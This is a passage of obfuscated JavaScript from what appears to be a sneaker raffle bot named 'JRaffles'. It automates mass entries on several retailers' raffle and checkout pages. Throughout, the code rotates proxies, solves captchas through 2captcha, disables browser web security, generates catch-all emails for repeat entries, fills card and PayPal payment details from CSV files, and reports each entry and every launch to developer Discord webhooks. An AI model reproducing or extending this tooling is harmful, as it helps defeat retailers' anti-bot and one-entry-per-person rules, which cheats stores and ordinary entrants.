            console['log'](_0x19564e() + '\x20[' + _0xfedc66['name'] + ']\x20Task\x20' + (_0x4e2582 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4242e0['type']('#comp_firstname', '' + _0x3812b6[_0x4e2582]['FirstName']), await _0x4242e0['waitForSelector']('#comp_lastname'), await _0x4242e0['type']('#comp_lastname', '' + _0x3812b6[_0x4e2582]['LastName']), await _0x4242e0['waitForSelector']('#comp_email'), await _0x4242e0['type']('#comp_email', '' + _0x3812b6[_0x4e2582]['Email']), await _0x4242e0['waitForSelector']('#comp_paypalemail'), await _0x4242e0['type']('#comp_paypalemail', '' + _0x3812b6[_0x4e2582]['Email']), await _0x4242e0['waitForSelector']('#comp_mobile_end'), await _0x4242e0['type']('#comp_mobile_end', '' + _0x3812b6[_0x4e2582]['Phone']), await _0x4242e0['waitForSelector']('#comp_dob'), await _0x4242e0['type']('#comp_dob', '08/09/1992'), console['log'](_0x19564e() + '\x20[' + _0xfedc66['name'] + ']\x20Task\x20' + (_0x4e2582 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x3812b6[_0x4e2582]['Size'] == 'RANDOM') {
                const _0x44d3ae = await _0x4242e0['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x51a7e2 => {
                    return _0x51a7e2['map'](_0x98fc27 => _0x98fc27['value']);
                });
                var _0x49ef4a = Math['round'](Math['random']() * (_0x44d3ae['length'] - 0x2));
                await _0x4242e0['select']('#shoesize', _0x44d3ae[_0x49ef4a + 0x1]), await _0x19d76a(0x3e8);
            } else {
                const _0x230f52 = await _0x4242e0['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x15a7c0 => {
                    return _0x15a7c0['map'](_0x94fa61 => _0x94fa61['innerText']);
                }), _0x3c5bdd = await _0x4242e0['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3e9cdc => {
                    return _0x3e9cdc['map'](_0x4f6071 => _0x4f6071['value']);
                });
                var _0x129031 = _0x3812b6[_0x4e2582]['Size'];
                for (var _0x34d2ad = 0x1; _0x34d2ad < _0x3c5bdd['length']; _0x34d2ad++) {
                    var _0x6b5f9b = _0x230f52[_0x34d2ad]['split']('\x20')[0x0];
                    if (_0x6b5f9b == _0x129031) {
                        await _0x4242e0['select']('#shoesize', _0x3c5bdd[_0x34d2ad]);
                        break;
                    } else {
                        if (_0x34d2ad + 0x1 == _0x3c5bdd['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x4242e0['waitForSelector']('#comp_address1'), await _0x4242e0['type']('#comp_address1', _0x3812b6[_0x4e2582]['Address1'] + '\x20' + _0x3812b6[_0x4e2582]['HouseNumber']), await _0x4242e0['waitForSelector']('#comp_address2'), await _0x4242e0['type']('#comp_address2', '' + _0x3812b6[_0x4e2582]['Address2']), await _0x4242e0['waitForSelector']('#comp_address2'), await _0x4242e0['type']('#comp_address3', '' + _0x3812b6[_0x4e2582]['City']), await _0x4242e0['waitForSelector']('#comp_postcode'), await _0x4242e0['type']('#comp_postcode', '' + _0x3812b6[_0x4e2582]['Zip']), console['log'](_0x19564e() + '\x20[' + _0xfedc66['name'] + ']\x20Task\x20' + (_0x4e2582 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x19d76a(0x4b0), await _0x4242e0['click']('label#emailhold'), await _0x19d76a(0x5dc), await _0x4242e0['click']('#preauth_tandc_email\x20>\x20label'), await _0x19d76a(0x5dc), await _0x4242e0['click']('#submit'), await _0x4242e0['waitForSelector']('#paymentWrap'), console['log'](_0x19564e() + '\x20[' + _0xfedc66['name'] + ']\x20Task\x20' + (_0x4e2582 + 0x1) + '\x20:\x20' + _0x304ca1['blue']('Awaiting\x20Paypal\x20Payment')), _0x4f1f50['on']('targetcreated', async _0xfa9fd4 => {
                if (_0xfa9fd4['type']() === 'page') {
                    const _0x453e23 = await _0xfa9fd4['page']();
                    async function _0x5d90c4() {
                        try {
                            await _0x4242e0['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x5bcc1a = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x2a7eb3() {
                        try {
                            await _0x4242e0['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x3a844a = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x2a7eb3(), _0x5d90c4(), await _0x19d76a(0x493e0);
                }
            });
            async function _0x2a5ced() {
                for (let _0x42bfd6 = 0x0; _0x42bfd6 < 0x12c; _0x42bfd6++) {
                    if (_0x3a844a == !![]) {
                        console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0xfedc66['name'] + ']\x20Task\x20' + (_0x4e2582 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '')
                            try {
                                await _0xdeed(_0x13b92f['webhook'], _0x574465['succesDEVMSG']);
                            } catch {
                            }
                        await _0x19d76a(0xc8), await _0xdeed(_0x25855c, _0x574465['succesDEVMSG']), await _0x19d76a(0xc8);
                        try {
                            await _0xdeed(_0x4c8fbe, _0x574465['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x5bcc1a)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x19d76a(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x19d76a(0xbb8), await _0x4242e0['click']('.zoid-outlet'), await _0x19d76a(0x7d0), await _0x2a5ced();
        } catch (_0x16d614) {
            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xfedc66['name'] + ']\x20Task\x20' + (_0x4e2582 + 0x1) + '\x20:\x20' + _0x16d614)), _0x1ad4a1 = '' + _0x16d614;
            var _0x38ff01 = await _0x83146(_0x3812b6[_0x4e2582], _0xfedc66, 'dev', !![], _0x1ad4a1);
            _0x574465['errorDEV'] = { 'embeds': [_0x38ff01] }, _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x574465['errorDEV']), await _0xdeed(_0x192865, _0x574465['errorDEV']);
        } finally {
            _0x4f1f50 && _0x4f1f50['close'](), console['log']('Waiting\x20for\x20' + _0x13b92f['delay'] + '\x20ms'), await _0x19d76a(_0x13b92f['delay']);
        }
    }
}
async function _0x701f73(_0x38a3fc, _0x2be22a, _0x164923) {
    _0x3102e9['use'](_0x5c5e7a()), _0x3102e9['use'](_0x45477b({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x13b92f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x428f71 = 0x0; _0x428f71 < _0x2be22a['length']; _0x428f71++) {
        _0x4bc62a(_0x38a3fc['name'] + '\x20Task\x20' + (_0x428f71 + 0x1) + '\x20/\x20' + _0x2be22a['length'] + '\x20||\x20File:\x20' + _0x5ece83 + '\x20Proxies:\x20' + _0x286bb6);
        var _0x72b82e = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x17ac6d
                },
                {
                    'name': 'Product',
                    'value': '' + _0x2be22a[_0x428f71]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2be22a[_0x428f71]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x13b92f['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x13b92f['version']
                }
            ]
        }];
        const _0x2ff971 = { 'embeds': _0x72b82e };
        await _0x423f7e(_0x2be22a, _0x428f71);
        if (_0x2be22a[_0x428f71]['Email'] == '' || _0x2be22a[_0x428f71]['Password'] == '' || _0x2be22a[_0x428f71]['FirstName'] == '' || _0x2be22a[_0x428f71]['LastName'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x2be22a[_0x428f71]['Password'] == '' || _0x2be22a[_0x428f71]['Password'] == undefined) && (_0x2be22a[_0x428f71]['Password'] = 'ErehsaWonRaj1!');
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x3e3653 = _0x164923[_0x428f71]['split'](':');
        else
            var _0xa9af82 = Math['round'](Math['random']() * (_0x164923['length'] - 0x1)), _0x3e3653 = _0x164923[_0xa9af82]['split'](':');
        const _0x255bc8 = await _0x3102e9['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3e3653[0x0] + ':' + _0x3e3653[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x973a6c = await _0x255bc8['newPage']();
            await _0x973a6c['authenticate']({
                'username': '' + _0x3e3653[0x2],
                'password': '' + _0x3e3653[0x3]
            }), console['log'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x973a6c['setRequestInterception'](!![]), _0x973a6c['on']('request', _0xb963d5 => {
                _0xb963d5['resourceType']() === 'image' || _0xb963d5['resourceType']() === 'font' || _0xb963d5['resourceType']() === 'media' ? _0xb963d5['abort']() : _0xb963d5['continue']();
            }), await _0x973a6c['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x973a6c['goto']('' + _0x2be22a[_0x428f71]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x973a6c['waitForSelector']('#btnPdpAtb'), console['log'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x2be22a[_0x428f71]['Size']);
            const _0x4477ad = await _0x973a6c['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x8c197f => {
                return _0x8c197f['map'](_0x2bca73 => _0x2bca73['innerText']);
            }), _0x5d99f5 = await _0x973a6c['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x1a68b2 = ![];
            if (_0x2be22a[_0x428f71]['Size'] == 'RANDOM') {
                var _0x1be826 = Math['round'](Math['random']() * (_0x5d99f5['length'] - 0x1));
                await _0x5d99f5[_0x1be826]['click']();
            } else
                for (var _0x5a84e5 = 0x0; _0x5a84e5 < _0x4477ad['length']; _0x5a84e5++) {
                    if (_0x4477ad[_0x5a84e5] != _0x2be22a[_0x428f71]['Size'])
                        continue;
                    try {
                        await _0x5d99f5[_0x5a84e5]['click']();
                    } catch {
                        console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x1a68b2 = !![];
                    }
                }
            if (_0x1a68b2)
                continue;
            await _0x19d76a(0x578), await _0x973a6c['click']('#btnPdpAtb'), await _0x973a6c['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x19d76a(0x3e8), console['log'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x973a6c['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x973a6c['waitForSelector']('#email'), await _0x973a6c['type']('#email', _0x2be22a[_0x428f71]['Email']), await _0x19d76a(0x226), await _0x973a6c['click']('#guest-submit'), await _0x19d76a(0x1b58), console['log'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x973a6c['waitForSelector']('#firstname'), await _0x973a6c['type']('#firstname', _0x2be22a[_0x428f71]['FirstName'], 0x1f4), await _0x19d76a(0x190), await _0x973a6c['waitForSelector']('#surname'), await _0x973a6c['type']('#surname', _0x2be22a[_0x428f71]['LastName'], 0x1f4), await _0x19d76a(0x190), await _0x973a6c['waitForSelector']('#mobile'), await _0x973a6c['type']('#mobile', _0x2be22a[_0x428f71]['Phone'], 0x1f4), await _0x19d76a(0x190), await _0x973a6c['click']('#enterManualDiv'), await _0x19d76a(0x5dc), await _0x973a6c['waitForSelector']('#address1'), await _0x973a6c['type']('#address1', _0x2be22a[_0x428f71]['Address1'] + '\x20' + _0x2be22a[_0x428f71]['HouseNumber'], 0x226), await _0x19d76a(0x384), await _0x973a6c['waitForSelector']('#address2'), await _0x973a6c['type']('#address2', '' + _0x2be22a[_0x428f71]['Address2'], 0x226), await _0x19d76a(0x320);
            const _0x595ab4 = await _0x973a6c['$$eval']('#countryselect_view3\x20>\x20option', _0x17179f => {
                return _0x17179f['map'](_0x46f3bd => _0x46f3bd['value']);
            });
            var _0x5acda4;
            for (var _0x2c0336 = 0x0; _0x2c0336 < _0x595ab4['length']; _0x2c0336++) {
                if (_0x595ab4[_0x2c0336]['startsWith']('' + _0x2be22a[_0x428f71]['Country'])) {
                    _0x5acda4 = _0x595ab4[_0x2c0336];
                    break;
                }
                continue;
            }
            await _0x973a6c['select']('#countryselect_view3', '' + _0x5acda4), await _0x973a6c['waitForSelector']('#address4'), await _0x973a6c['type']('#address4', '' + _0x2be22a[_0x428f71]['City'], 0x1f4), await _0x19d76a(0x384), await _0x973a6c['waitForSelector']('#postcode'), await _0x973a6c['type']('#postcode', '' + _0x2be22a[_0x428f71]['Zip'], 0x1f4), await _0x19d76a(0x4b0);
            const _0x420949 = await _0x973a6c['url']();
            console['log'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x445dbb = _0x420949['split']('?')[0x1], _0x3b7b7a = await _0x973a6c['$']('#co_address_submit');
            await _0x3b7b7a['evaluate'](_0x59ebc7 => _0x59ebc7['click']()), await _0x19d76a(0x1388), await _0x973a6c['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x445dbb), console['log'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x973a6c['waitForSelector']('#paymentbuttons'), await _0x19d76a(0x1388), await _0x973a6c['click']('#paymentbuttons\x20>\x20div'), await _0x19d76a(0x1c2), await _0x973a6c['waitForSelector']('#card-number'), await _0x973a6c['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x552316 = await _0x973a6c['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x1ccc0d = await _0x552316['contentFrame']();
            await _0x1ccc0d['waitForSelector']('.InputContainer'), await _0x1ccc0d['click']('.InputContainer\x20>\x20input'), await _0x19d76a(0x578), await _0x973a6c['type']('#card-number', '' + _0x2be22a[_0x428f71]['CreditNumber']), await _0x19d76a(0xfa), await _0x973a6c['type']('#card-expiry', '' + _0x2be22a[_0x428f71]['ExpiryDate']), await _0x19d76a(0xfa), await _0x973a6c['type']('#card-cvc', '' + _0x2be22a[_0x428f71]['CVV']), await _0x19d76a(0x7d0), await _0x973a6c['click']('#card-button'), console['log'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x973a6c['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0xdeed(_0x25855c, _0x2ff971);
            } catch {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x203DS\x20Failed')), _0x72b82e[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x72b82e[0x0]['description'] = '3DS\x20Failed', await _0xdeed(_0x192865, _0x2ff971);
            }
        } catch (_0x2a9d52) {
            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x38a3fc['name'] + ']\x20Task\x20' + (_0x428f71 + 0x1) + '\x20:\x20' + _0x2a9d52)), _0x72b82e[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x72b82e[0x0]['description'] = '' + _0x2a9d52, await _0xdeed(_0x192865, _0x2ff971);
        } finally {
            _0x255bc8 && _0x255bc8['close']();
            if (_0x428f71 + 0x1 == _0x2be22a['length']) {
                console['log'](_0x304ca1['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x19d76a(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x13b92f['AfewDelay'] + '\x20ms'), await _0x19d76a(_0x13b92f['AfewDelay']);
        }
    }
}
async function _0x493838(_0x4ad06a, _0x18282e, _0x302d0e, _0x2fb616, _0x80e340) {
    var _0x4b252e, _0x1336f2 = {}, _0x8e86b8 = [], _0x43cd39 = {}, _0x2d0dc7 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x2fb616 && (_0x2fb616 = {});
    if (_0x18282e != 'ver') {
        _0x4bc62a(_0x302d0e['name'] + '\x20Task\x20' + (_0x4ad06a + 0x1) + '\x20/\x20' + _0x2fb616['length'] + '\x20||\x20File:\x20' + _0x5ece83 + '\x20Proxies:\x20' + _0x286bb6), await _0x423f7e(_0x2fb616, _0x4ad06a), _0x8e86b8 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x17ac6d
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2fb616[_0x4ad06a]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x13b92f['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x520c59
                }
            ]
        }], _0x43cd39 = { 'embeds': _0x8e86b8 }, _0x1336f2 = _0x302d0e['data'];
        _0x18282e == 'exp' ? _0x1336f2['data']['attributes']['email'] = '' + _0x2fb616[_0x4ad06a]['FirstName'] + _0x2fb616[_0x4ad06a]['LastName'] + _0x13b92f['catchall'] : _0x1336f2['data']['attributes']['email'] = '' + _0x2fb616[_0x4ad06a]['Email'];
        if (_0x2fb616[_0x4ad06a]['Size'] == 'RANDOM') {
        }
        _0x1336f2['data']['attributes']['properties']['$first_name'] = '' + _0x2fb616[_0x4ad06a]['FirstName'], _0x1336f2['data']['attributes']['properties']['$last_name'] = '' + _0x2fb616[_0x4ad06a]['LastName'], _0x1336f2['data']['attributes']['properties']['$address1'] = _0x2fb616[_0x4ad06a]['Address1'] + '\x20' + _0x2fb616[_0x4ad06a]['Address2'] + '\x20' + _0x2fb616[_0x4ad06a]['HouseNumber'], _0x1336f2['data']['attributes']['properties']['$zip'] = '' + _0x2fb616[_0x4ad06a]['Zip'], _0x1336f2['data']['attributes']['properties']['$city'] = '' + _0x2fb616[_0x4ad06a]['City'], _0x1336f2['data']['attributes']['properties']['$country'] = '' + _0x2fb616[_0x4ad06a]['Country'], _0x1336f2['data']['attributes']['properties']['Size'] = '' + _0x2fb616[_0x4ad06a]['Size'], _0x1336f2['data']['attributes']['properties']['$phone_number'] = '' + _0x2fb616[_0x4ad06a]['Phone'], _0x1336f2['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2fb616[_0x4ad06a]['Follower'];
    }
    if (_0x13b92f['useRandomProxy'] = ![])
        var _0x212f7d = _0x80e340[_0x4ad06a]['split'](':');
    else
        var _0x2b3c29 = Math['round'](Math['random']() * (_0x80e340['length'] - 0x1)), _0x212f7d = _0x80e340[_0x2b3c29]['split'](':');
    var _0xc83d63 = {
        'jar': _0x599249,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x302d0e['url'],
        'headers': _0x302d0e['headers'],
        'body': JSON['stringify'](_0x1336f2),
        'proxy': 'http://' + _0x212f7d[0x2] + ':' + _0x212f7d[0x3] + '@' + _0x212f7d[0x0] + ':' + _0x212f7d[0x1]
    };
    return _0x18282e != 'ver' && (_0xc83d63['url'] = _0x302d0e['url'], _0xc83d63['headers'] = _0x302d0e['headers']), _0x18282e == 'ver' && (_0xc83d63['method'] = 'GET'), new Promise(function (_0x2f7c29, _0x5eb2b5) {
        callback = async (_0x192fbc, _0x767f0c, _0x325763) => {
            if (!_0x192fbc && _0x767f0c['statusCode'] == 0xca || !_0x192fbc && _0x767f0c['statusCode'] == 0xc8) {
                if (_0x18282e != 'ver') {
                    var _0x525190 = await _0x83146(_0x2fb616[_0x4ad06a], _0x302d0e, 'dev', ![]), _0x41fb7b = await _0x83146(_0x2fb616[_0x4ad06a], _0x302d0e, 'pub', ![]);
                    const _0x189f33 = {
                        'succesDEVMSG': { 'embeds': [_0x525190] },
                        'succesPUBMSG': { 'embeds': [_0x41fb7b] }
                    };
                    if (_0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '')
                        try {
                            await _0xdeed(_0x13b92f['webhook'], _0x189f33['succesDEVMSG']);
                        } catch {
                        }
                    await _0x19d76a(0xc8), await _0xdeed(_0x25855c, _0x189f33['succesDEVMSG']), await _0x19d76a(0xc8);
                    try {
                        await _0xdeed(_0x4c8fbe, _0x189f33['succesPUBMSG']);
                    } catch {
                    }
                }
                _0x2f7c29(console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x302d0e['name'] + ']\x20Task\x20' + (_0x4ad06a + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x18282e != 'ver') {
                    var _0xc641aa = '' + _0x192fbc, _0x41d32c = await _0x83146(_0x2fb616[_0x4ad06a], _0x302d0e, 'dev', !![], _0xc641aa), _0x1e77e5 = {};
                    _0x1e77e5['errorDEV'] = { 'embeds': [_0x41d32c] }, _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x1e77e5['errorDEV']), await _0xdeed(_0x192865, _0x1e77e5['errorDEV']);
                }
                _0x5eb2b5(console['log'](_0x19564e() + '\x20[' + _0x302d0e['name'] + ']\x20Task\x20' + (_0x4ad06a + 0x1) + ':\x20' + _0x192fbc));
            }
        };
        try {
            _0x18282e != 'ver' && console['log'](_0x19564e() + '\x20[' + _0x302d0e['name'] + ']\x20Task\x20' + (_0x4ad06a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1336f2['data']['attributes']['email']), _0x1b2891(_0xc83d63, callback);
        } catch (_0x832b3f) {
            console['log'](_0x19564e() + '\x20Task\x20' + (_0x4ad06a + 0x1) + ':\x20' + _0x832b3f);
        }
    });
}
;
async function _0x105b4a(_0x483aac, _0xed22bf, _0x39b705) {
    _0x4bc62a('' + _0xed22bf), _0x3102e9['use'](_0x5c5e7a());
    const _0x62f1b1 = await _0x3102e9['launch']({
        'headless': ![],
        'args': [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security'
        ]
    });
    try {
        console['log'](_0x19564e() + '\x20[' + _0xed22bf + ']\x20Getting\x20Session');
        const _0xcf12ce = await _0x62f1b1['newPage']();
        await _0xcf12ce['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0xcf12ce['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x19564e() + '\x20[' + _0xed22bf + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0xcf12ce['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x19564e() + '\x20[' + _0xed22bf + ']\x20Successfully\x20logged\x20in'), await _0x19d76a(0x2710);
        } catch {
            throw new Error('Login\x20session\x20expired');
        }
        for (var _0x464d1a = 0x0; _0x464d1a < _0x483aac['length']; _0x464d1a++) {
            console['log'](_0x19564e() + '\x20[' + _0xed22bf + ']\x20Task\x20' + (_0x464d1a + 0x1) + '\x20:\x20Starting\x20Verification'), _0x4bc62a(_0xed22bf + '\x20Task\x20' + (_0x464d1a + 0x1) + '\x20/\x20' + _0x483aac['length']), await _0xcf12ce['goto']('' + _0x483aac[_0x464d1a], { 'waitUntil': 'networkidle2' }), await _0x19d76a(0xbb8);
            try {
                const _0x580513 = await _0xcf12ce['$']('#challenge-heading');
                _0x580513 && console['log'](_0x19564e() + '\x20[' + _0xed22bf + ']\x20Task\x20' + (_0x464d1a + 0x1) + '\x20:\x20' + _0x304ca1['yellow']('2FA\x20Required'));
                console['log']('after\x20network'), await _0xcf12ce['waitForSelector']('#payment-submit-btn', { 'timeout': 0x493e0 }), console['log']('after\x20waitfor'), await _0x19d76a(0x5dc), await _0xcf12ce['$eval']('#payment-submit-btn', _0x575f61 => _0x575f61['click']()), await _0xcf12ce['click']('#payment-submit-btn');
                try {
                    await _0xcf12ce['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x19d76a(0x5dc), console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0xed22bf + ']\x20Task\x20' + (_0x464d1a + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x13ca76) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x13ca76['message']);
                }
            } catch {
            }
            await _0x19d76a(0xf4240);
        }
    } catch (_0x4e725f) {
        console['log'](_0x304ca1['red']('' + _0x4e725f));
    } finally {
        await _0x62f1b1['close']();
    }
}
async function _0x2983f1() {
    await _0x2eb434(), console['clear']();
    if (_0x520c59 != 'devkey') {
        let _0x339b63 = await _0x583c01['autoUpdate']();
        if (_0x339b63 === 'yes')
            return _0x365f27('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x2fc3bb == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x19d76a(0x2710);
        ;
    }
    await _0xeab46b(_0x2fc3bb);
    if (_0x3216c4 === ![])
        return console['log']('Closing\x20Browser'), await _0x19d76a(0xbb8);
    else
        try {
            var _0x26cd81 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x17ac6d
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x520c59
                    }
                ]
            }];
            const _0x3b9892 = { 'embeds': _0x26cd81 };
            var _0x3a5e9c = await _0x83146(null, null, 'open', ![]);
            const _0xf63fe8 = { 'openDEVMSG': { 'embeds': [_0x3a5e9c] } };
            await _0xdeed(_0x30573a, _0xf63fe8['openDEVMSG']);
            async function _0x4adaa1() {
                _0x4bc62a('JRaffles\x20' + _0x520c59), console['clear'](), console['log']('Welcome\x20to\x20' + _0x304ca1['cyan']('JRaffles();') + '\x20' + _0x520c59), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x241ce4 = 0x0; _0x241ce4 < _0xc93d09['length'] - 0x2; _0x241ce4++) {
                    if (_0xc93d09[_0x241ce4]['name'] === 'Reload\x20Settings' || _0xc93d09[_0x241ce4]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x241ce4 + ')\x20[' + _0xc93d09[_0x241ce4]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0xc93d09['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0xc93d09['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x13f0ae();
                if (taskModule > _0xc93d09['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x19d76a(0x3e8), _0x4adaa1();
                if (_0xc93d09[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x1ca812(_0xc93d09[taskModule]['modules']);
                    var _0x4c265f = _0xc93d09[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x272c91 = await _0x265cea(), _0x296623 = await _0x563ba1();
                    if (_0x296623[0x0]['Url'] == '' || _0x296623[0x0]['Url'] == undefined) {
                        await _0x12cd3d(_0x272c91);
                        var _0x52e005 = await _0x48b076();
                        return await afewFunction('' + _0x102540[_0x52e005], 'nor', _0x4c265f, _0x296623, _0x272c91), _0x4adaa1();
                    }
                    return await afewFunction(_0x296623[0x0]['Url'], 'nor', _0x4c265f, _0x296623, _0x272c91), _0x4adaa1();
                } else {
                    if (_0xc93d09[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x1ca812(_0xc93d09[taskModule]['modules']);
                        var _0x4c265f = _0xc93d09[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x272c91 = await _0x265cea(), _0x11c2d1 = await _0x563ba1();
                            console['log']('Starting\x20' + _0x11c2d1['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x1f97b6 = 0x0; _0x1f97b6 < _0x11c2d1['length']; _0x1f97b6++) {
                                console['log'](_0x19564e() + '\x20[' + _0x4c265f['name'] + ']\x20Task\x20' + (_0x1f97b6 + 0x1) + ':\x20Getting\x20Session'), await _0x36d9a6(_0x1f97b6, 'nor', _0x4c265f, _0x11c2d1, _0x272c91), console['log'](_0x19564e() + '\x20[' + _0x4c265f['name'] + ']\x20Sleeping\x20for\x20' + _0x13b92f['MahaDelay'] + '\x20ms'), await _0x19d76a(_0x13b92f['MahaDelay']);
                            }
                            ;
                            return _0x4adaa1();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x272c91 = await _0x265cea();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), linksRaw = await _0x549519(), _0x2411aa = linksRaw['split'](';'), console['log'](_0x2411aa['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
